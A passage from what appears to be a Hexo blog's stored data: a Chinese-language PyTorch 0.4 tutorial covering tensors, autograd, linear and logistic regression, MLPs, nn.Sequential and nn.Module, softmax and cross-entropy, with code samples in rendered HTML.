$e^{z_1},e^{z_2},…,e^{z_k}$，每一项都除以求和\n\n$$\\frac{e^{z_i}}{\\sum^k_{j=1}e^{z_j}}$$\n\n于是所有项求和等于1，每一项分别表示其中某一种的概率。\n\n**交叉熵**\n\n多分类问题使用更加复杂的loss函数，交叉熵。\n\n$$cross\\_entropy(p,q)=E_p\\[-logq\\]=-\\frac{1}{m}p(x)logq(x)$$\n\n这里需要back up一下。所谓 **熵** 是用来反应信息量的。\n\n+ 信息量\n\n  假设 $X$ 是一个离散随机变量，概率分布为 $p(x)=Pr(X=x)$，事件 $X=x_0$的信息量为 $I(x_0)=-log(p(x_0))$。从表达式可以看出，概率越大，信息量越小。概率越大，大家越会认为这一事件的发生几乎是确定的，这一事件的发生并不会引入太多信息量。\n\n+ 熵\n\n  假设李华考试结果为一个0-1分布，{0不及格，1及格}，根据先验知识，由于李华不好好学习，考试及格(记为事件A)概率是$p(x_A)=0.1$，不及格的概率是0.9，则所有可能结果带来的额外信息的期望为\n\n  $$H_A(x)=-[p(x_A)log(p(x_A))+(1-P(x_A))log(1-p(x_A))]=0.469$$\n\n  如果还有一个张华成绩不好不坏，考试及格(记为时间B)概率是 $p(x_B)=0.5$\n\n  $$H_B(x)=-[p(x_B)log(p(x_B))+(1-P(x_B))log(1-p(x_B))]=1$$\n\n  说明在成绩出来前，猜出张华的结果比李华要难。熵越大，变量取值越不稳定。\n\n+ 交叉熵\n\n  两个分布$p,q$，$CEH(p,q)=E_p\\[-logq\\]$\n\n\n\n对于二分类问题，loss可以写为\n\n$$-\\frac{1}{m}\\sum^m_{i=1}(y^ilog\\, sigmod(x^i)+(1-y^i)log(1-sigmod(x^i)))$$\n\n```python\n# pytorch 提供了交叉熵函数\ncriterion = nn.CrossEntropyLoss()\n```\n\n### 1.4 参数初始化\n\n+ **使用numpy初始化**\n\n\n","slug":"pytorchbg","published":1,"date":"2018-04-22T16:00:00.000Z","updated":"2018-05-06T10:35:59.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizbc000qrikeet2f3i11","content":"<blockquote>\n<p>“防止以后踩坑”</p>\n</blockquote>\n<p>第一眼看到pytorch就十分喜欢，就像第一眼看到golang。</p>\n<p>pytorch 0.4 发布，api改了。。。</p>\n<h3 id=\"0-0-Tensor-and-Variable\"><a href=\"#0-0-Tensor-and-Variable\" class=\"headerlink\" title=\"0.0 Tensor and Variable\"></a>0.0 Tensor and Variable</h3><ul>\n<li><strong>Tensor</strong></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 沿行取最大值</span></span><br><span class=\"line\">max_value, max_idx = torch.max(x, dim=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\"># 沿行求和</span></span><br><span class=\"line\">sum_x = torch.sum(x, dim=<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 增减维度</span></span><br><span class=\"line\">x = x.unsqueeze(<span class=\"number\">0</span>) <span class=\"comment\"># 在第一维增加</span></span><br><span class=\"line\">x = x.unsqueeze(<span class=\"number\">1</span>) <span class=\"comment\"># 在第二维增加</span></span><br><span class=\"line\"></span><br><span class=\"line\">x = x.squeeze(<span class=\"number\">0</span>)   <span class=\"comment\"># 减少第一维度</span></span><br><span class=\"line\">x = x.squeeze()    <span class=\"comment\"># tensor中所有维度为1全部去掉</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 维度交换</span></span><br><span class=\"line\">x = torch.randn(<span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\"># permute 重新排列</span></span><br><span class=\"line\">x = x.permute(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>) <span class=\"comment\"># x : torch.Size([4, 3, 5])</span></span><br><span class=\"line\"><span class=\"comment\"># transpose 交换 tensor 中两个维度</span></span><br><span class=\"line\">x = x.transpose(<span class=\"number\">0</span>, <span class=\"number\">2</span>)  <span class=\"comment\"># x : torch.Size([5, 3, 4])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># view 对 tensor 进行 reshape</span></span><br><span class=\"line\">x = torch.randn(<span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\">x = x.view(<span class=\"number\">-1</span>, <span class=\"number\">5</span>) <span class=\"comment\"># -1 表示任意大小，5 表示第二维变成 5</span></span><br><span class=\"line\">\t\t\t\t  <span class=\"comment\"># x : torch.Size([12, 5])</span></span><br><span class=\"line\">x = x.view(<span class=\"number\">3</span>, <span class=\"number\">20</span>) <span class=\"comment\"># x : torch.Size([3, 20])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># inplace 操作，直接对tensor操作而不需要另外开辟内存空间。一般是操作符后加_</span></span><br><span class=\"line\">x.unsqueeze_(<span class=\"number\">0</span>)     <span class=\"comment\"># unsqueeze 进行 inplace</span></span><br><span class=\"line\">x.transpose_(<span class=\"number\">1</span>, <span class=\"number\">0</span>)  <span class=\"comment\"># transpose 进行 inplace</span></span><br><span class=\"line\"></span><br><span class=\"line\">x = torch.ones(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">y = torch.ones(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">x.add_(y)\t<span class=\"comment\"># add 进行 inplace</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><p><strong>Variable</strong></p>\n<p>Variable 是对 tensor 的封装，每个 Variabel都有三个属性，Variable 中的 tensor本身<code>.data</code>，对应 tensor 的梯度<code>.grad</code>以及这个 Variable 是通过什么方式得到的<code>.grad_fn</code></p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x_tensor = torch.randn(<span class=\"number\">10</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\">y_tensor = torch.randn(<span class=\"number\">10</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 tensor 变成 Variable</span></span><br><span class=\"line\">x = Variable(x_tensor, requires_grad=<span class=\"keyword\">True</span>) </span><br><span class=\"line\"><span class=\"comment\"># 默认 Variable 是不需要求梯度的，所以申明需要对其进行求梯度</span></span><br><span class=\"line\">y = Variable(y_tensor, requires_grad=<span class=\"keyword\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">z = torch.sum(x + y)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 求 x 和 y 的梯度</span></span><br><span class=\"line\">z.backward()</span><br><span class=\"line\"></span><br><span class=\"line\">print(x.grad)</span><br><span class=\"line\"><span class=\"comment\"># Variable containing:</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\">#     1     1     1     1     1</span></span><br><span class=\"line\"><span class=\"comment\"># [torch.FloatTensor of size 10x5]</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(y.grad)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0-1-自动求导\"><a href=\"#0-1-自动求导\" class=\"headerlink\" title=\"0.1 自动求导\"></a>0.1 自动求导</h3><ul>\n<li><p><strong>多次自动求导</strong></p>\n<p>调用 backward 后自动计算一次导数，再次调用会报错，因为pytorch默认做完一次自动求导后，计算图被丢弃，两次求导需要手动设置。</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = Variable(torch.FloatTensor([<span class=\"number\">3</span>]), requires_grad=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">y = x * <span class=\"number\">2</span> + x ** <span class=\"number\">2</span> + <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward(retain_graph=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">print(x.grad)</span><br><span class=\"line\"><span class=\"comment\"># Variable containing:</span></span><br><span class=\"line\"><span class=\"comment\">#  8</span></span><br><span class=\"line\"><span class=\"comment\"># [torch.FloatTensor of size 1]</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward(retain_graph=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">print(x.grad) </span><br><span class=\"line\"><span class=\"comment\"># 输出 16，因为做了两次自动求导，所以将第一次的梯度 8 和第二次的梯度 8 相加得到 16</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward() <span class=\"comment\"># 再做一次自动求导，这次不保留计算图</span></span><br><span class=\"line\">print(x.grad)</span><br><span class=\"line\"><span class=\"comment\"># 输出 24</span></span><br><span class=\"line\"></span><br><span class=\"line\">y.backward() <span class=\"comment\"># 再做会报错，计算图已经丢弃</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"0-2-动态图与静态图\"><a href=\"#0-2-动态图与静态图\" class=\"headerlink\" title=\"0.2 动态图与静态图\"></a>0.2 动态图与静态图</h3><p>pytorch与python的写法基本一致，没有任何额外的学习成本。tensorflow需要先定义图，然后执行，不能直接使用while，需要使用tf.while_loop，有些反直觉。</p>\n<h3 id=\"1-0-线性模型与梯度下降\"><a href=\"#1-0-线性模型与梯度下降\" class=\"headerlink\" title=\"1.0 线性模型与梯度下降\"></a>1.0 线性模型与梯度下降</h3><p>最简单的线性模型$y=x*w+b$，计算误差函数为$\\frac{1}{n}\\sum^n_{i=1}(\\widehat{y}_i-y_i)^2$</p>\n<p>数分里都学过梯度的意义在于，沿着梯度函数变化最快，为了尽快找到误差的最小值，需要沿着梯度方向更新$w,b$，二者的梯度分别为</p>\n<p>$$\\frac{\\partial}{\\partial w}=\\frac{2}{n}\\sum^n_{i=1}x_i(wx_i+b-y_i)$$</p>\n<p>$$\\frac{\\partial}{\\partial b}=\\frac{2}{n}\\sum^n_{i=1}(wx_i+b-y_i)$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.autograd <span class=\"keyword\">import</span> Variable</span><br><span class=\"line\">torch.manual_seed(<span class=\"number\">2018</span>)</span><br><span class=\"line\"><span class=\"comment\"># 读入数据 x 和 y</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读入数据 x 和 y</span></span><br><span class=\"line\">x_train = np.array([...], dtype=np.float32)</span><br><span class=\"line\">y_train = np.array([...], dtype=np.float32)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 转换成 Tensor</span></span><br><span class=\"line\">x_train = torch.from_numpy(x_train)</span><br><span class=\"line\">y_train = torch.from_numpy(y_train)</span><br><span class=\"line\"><span class=\"comment\"># 定义参数 w 和 b</span></span><br><span class=\"line\">w = Variable(torch.randn(<span class=\"number\">1</span>), requires_grad=<span class=\"keyword\">True</span>) <span class=\"comment\"># 随机初始化</span></span><br><span class=\"line\">b = Variable(torch.zeros(<span class=\"number\">1</span>), requires_grad=<span class=\"keyword\">True</span>) <span class=\"comment\"># 使用0进行初始化</span></span><br><span class=\"line\"><span class=\"comment\"># 构建线性回归模型</span></span><br><span class=\"line\">x_train = Variable(x_train)</span><br><span class=\"line\">y_train = Variable(y_train)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">linear_model</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * w + b</span><br><span class=\"line\"><span class=\"comment\"># 计算误差</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_loss</span><span class=\"params\">(y_, y)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.mean((y_ - y_train) ** <span class=\"number\">2</span>)</span><br><span class=\"line\">loss = get_loss(y_, y_train)</span><br><span class=\"line\"><span class=\"comment\"># 自动求导</span></span><br><span class=\"line\">loss.backward()</span><br><span class=\"line\"><span class=\"comment\"># 查看 w 和 b 的梯度</span></span><br><span class=\"line\">print(w.grad)</span><br><span class=\"line\">print(b.grad)</span><br><span class=\"line\"><span class=\"comment\"># 更新一次参数</span></span><br><span class=\"line\">w.data = w.data - <span class=\"number\">1e-2</span> * w.grad.data</span><br><span class=\"line\">b.data = b.data - <span class=\"number\">1e-2</span> * b.grad.data</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-1-逻辑回归\"><a href=\"#1-1-逻辑回归\" class=\"headerlink\" title=\"1.1 逻辑回归\"></a>1.1 逻辑回归</h3><p>Logistic 回归处理的是一个分类问题 (二分类)，形式与线性回归一样，都是 $y=wx+b$，但是它使用 Sigmod 函数将结果变到 0 ~ 1 之间。对于任意输入一个数据，经过 Sigmoid 之后的结果记为 $\\widehat{y}$</p>\n<ul>\n<li>损失函数</li>\n</ul>\n<p>$$loss=-(ylog(\\widehat{y})+(1-y)log(1-\\widehat{y}))$$</p>\n<p>$y$ 表示真实 label，取值 {0, 1}。如果 $y$ 是 0，表示属于第一类，则希望 $\\widehat{y}$ 越小越好，这时 $loss$ 函数为，$loss=-(log(1-\\widehat{y}))$，根据函数单调性，最小化 $loss$ 也就是最小化 $\\widehat{y}$，与要求一致。</p>\n<p>如果 $y$ 是 1，表示属于第二类，则希望 $\\widehat{y}$ 越大越好，这时 $loss$ 函数为，$loss=-(log(\\widehat{y}))$，最小化 $loss$ 是最大化 $\\widehat{y}$。</p>\n<p>使用 <code>torch.optim</code> 更新参数，需要配合另一个数据类型 <code>nn.Parameter</code>，本质上与 Variable 一样，但是 Parameter 默认要求梯度。pytorch 也提供了 Sigmode 函数，通过导入 <code>torch.nn.functional</code> 使用。</p>\n<p>pytorch 提供了 <code>nn.BCEWithLogitsLoss()</code>，将 sigmoid 和 loss 写在一层，有更快的速度与稳定性。所以使用它的话，就不需要再定义 Sigmod 函数了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 不使用自带的loss</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\">w = nn.Parameter(torch.randn(<span class=\"number\">2</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">b = nn.Parameter(torch.zeros(<span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"comment\"># 定义sigmod</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logistic_regression</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> F.sigmoid(torch.mm(x, w) + b)</span><br><span class=\"line\"><span class=\"comment\"># 定义loss</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_loss</span><span class=\"params\">(y_pred, y)</span>:</span></span><br><span class=\"line\">    logits = (y * y_pred.clamp(<span class=\"number\">1e-12</span>).log() + (<span class=\"number\">1</span> - y) * (<span class=\"number\">1</span> - y_pred).clamp(<span class=\"number\">1e-12</span>).log()).mean()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> -logits</span><br><span class=\"line\"><span class=\"comment\">#- - - - - - - - - - - - - - - - - - - -</span></span><br><span class=\"line\">optimizer = torch.optim.SGD([w, b], lr=<span class=\"number\">1.</span>)</span><br><span class=\"line\"><span class=\"comment\"># 前向传播</span></span><br><span class=\"line\">y_pred = logistic_regression(x_data)</span><br><span class=\"line\">loss = binary_loss(y_pred, y_data) <span class=\"comment\"># 计算 loss</span></span><br><span class=\"line\"><span class=\"comment\"># 反向传播</span></span><br><span class=\"line\">optimizer.zero_grad() <span class=\"comment\"># 使用优化器将梯度归 0</span></span><br><span class=\"line\">loss.backward()</span><br><span class=\"line\">optimizer.step() <span class=\"comment\"># 使用优化器来更新参数</span></span><br><span class=\"line\"><span class=\"comment\">##########################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用自带的loss</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\">criterion = nn.BCEWithLogitsLoss()</span><br><span class=\"line\"><span class=\"comment\"># 使用 torch.optim 更新参数</span></span><br><span class=\"line\">w = nn.Parameter(torch.randn(<span class=\"number\">2</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">b = nn.Parameter(torch.zeros(<span class=\"number\">1</span>))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logistic_reg</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.mm(x, w) + b</span><br><span class=\"line\"><span class=\"comment\">#- - - - - - - - - - - - - - - - - - - -</span></span><br><span class=\"line\">optimizer = torch.optim.SGD([w, b], lr=<span class=\"number\">1.</span>)</span><br><span class=\"line\"><span class=\"comment\"># 前向传播</span></span><br><span class=\"line\">y_pred = logistic_reg(x_data)</span><br><span class=\"line\">loss = criterion(y_pred, y_data)</span><br><span class=\"line\"><span class=\"comment\"># 反向传播</span></span><br><span class=\"line\">optimizer.zero_grad()</span><br><span class=\"line\">loss.backward()</span><br><span class=\"line\">optimizer.step()</span><br><span class=\"line\"><span class=\"comment\"># 计算正确率</span></span><br><span class=\"line\">mask = y_pred.ge(<span class=\"number\">0.5</span>).float()</span><br><span class=\"line\">acc = (mask == y_data).sum().data[<span class=\"number\">0</span>] / y_data.shape[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-2-MLP-Sequential-Module\"><a href=\"#1-2-MLP-Sequential-Module\" class=\"headerlink\" title=\"1.2 MLP, Sequential, Module\"></a>1.2 MLP, Sequential, Module</h3><p><strong>MLP</strong></p>\n<p>神经网络使用的激活函数都是非线性的，sigmode函数 $\\sigma(x)=\\frac{1}{1+e^{-x}}$，tanh函数 $tanh(x)=2\\sigma(2x)-1$，ReLU函数 $ReLU(x)=max(0,x)$。其中ReLU使用的较多，因为计算简单，可以加速梯度下降的收敛速度。</p>\n<ul>\n<li><p>为什么要使用激活函数</p>\n<p>假设一个两层的网络，不使用激活函数，结构为$y=w_2(w_1x)=(w_2w_1)x=wx$，实际和一个一层的网络一样。</p>\n<p>通过使用激活函数，网络可以通过改变权重实现任意形状，成为非线性分类器。</p>\n</li>\n</ul>\n<p><strong>Sequential</strong></p>\n<p>Sequential 用来构建序列化模型</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># sequential</span></span><br><span class=\"line\">seq_net = nn.Sequential(</span><br><span class=\"line\">\tnn.Linear(<span class=\"number\">2</span>,<span class=\"number\">4</span>),</span><br><span class=\"line\">    nn.Tanh(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">4</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># 序列化模型可以通过索引访问每一层</span></span><br><span class=\"line\">seq_net[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"comment\"># 打印第一层权重</span></span><br><span class=\"line\">w0 = seq_net[<span class=\"number\">0</span>].weight</span><br><span class=\"line\">print(w0)</span><br><span class=\"line\"><span class=\"comment\"># 通过parameters获得模型参数</span></span><br><span class=\"line\">param = seq_net.parameters()</span><br><span class=\"line\"><span class=\"comment\"># 定义优化器</span></span><br><span class=\"line\">optim = torch.optim.SGD(param, <span class=\"number\">1.</span>)</span><br></pre></td></tr></table></figure>\n<p>保存模型</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 将参数和模型保存在一起</span></span><br><span class=\"line\">torch.save(seq_net, <span class=\"string\">'save_seq_net.pth'</span>)</span><br><span class=\"line\"><span class=\"comment\"># 读取保存的模型</span></span><br><span class=\"line\">seq_net1 = torch.load(<span class=\"string\">'save_seq_net.pth'</span>)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 只保存模型参数</span></span><br><span class=\"line\">torch.save(seq_net.state_dict(), <span class=\"string\">'save_seq_net_params.pth'</span>)</span><br><span class=\"line\"><span class=\"comment\"># 要重新读入模型的参数，首先我们需要重新定义一次模型，接着重新读入参数</span></span><br><span class=\"line\">seq_net2 = nn.Sequential(</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">2</span>, <span class=\"number\">4</span>),</span><br><span class=\"line\">    nn.Tanh(),</span><br><span class=\"line\">    nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\">seq_net2.load_state_dict(torch.load(<span class=\"string\">'save_seq_net_params.pth'</span>))</span><br></pre></td></tr></table></figure>\n<p><strong>Module</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># module模板</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> 网络名字<span class=\"params\">(nn.Module)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, 一些定义的参数)</span>:</span></span><br><span class=\"line\">        super(网络名字, self).__init__()</span><br><span class=\"line\">        self.layer1 = nn.Linear(num_input, num_hidden)</span><br><span class=\"line\">        self.layer2 = nn.Sequential(...)</span><br><span class=\"line\">        ...</span><br><span class=\"line\"></span><br><span class=\"line\">        定义需要用的网络层</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span><span class=\"params\">(self, x)</span>:</span> <span class=\"comment\"># 定义前向传播</span></span><br><span class=\"line\">        x1 = self.layer1(x)</span><br><span class=\"line\">        x2 = self.layer2(x)</span><br><span class=\"line\">        x = x1 + x2</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\"># 访问模型中的某层可以直接通过名字</span></span><br><span class=\"line\">l1 = 网络名字.layer1</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-3-多分类网络\"><a href=\"#1-3-多分类网络\" class=\"headerlink\" title=\"1.3 多分类网络\"></a>1.3 多分类网络</h3><p><strong>softmax</strong></p>\n<p>设多分类网络输出为 $z_1,z_2,…,z_k$，首先取指数变成 $e^{z_1},e^{z_2},…,e^{z_k}$，每一项都除以求和</p>\n<p>$$\\frac{e^{z_i}}{\\sum^k_{j=1}e^{z_j}}$$</p>\n<p>于是所有项求和等于1，每一项分别表示其中某一种的概率。</p>\n<p><strong>交叉熵</strong></p>\n<p>多分类问题使用更加复杂的loss函数，交叉熵。</p>\n<p>$$cross_entropy(p,q)=E_p[-logq]=-\\frac{1}{m}p(x)logq(x)$$</p>\n<p>这里需要back up一下。所谓 <strong>熵</strong> 是用来反应信息量的。</p>\n<ul>\n<li><p>信息量</p>\n<p>假设 $X$ 是一个离散随机变量，概率分布为 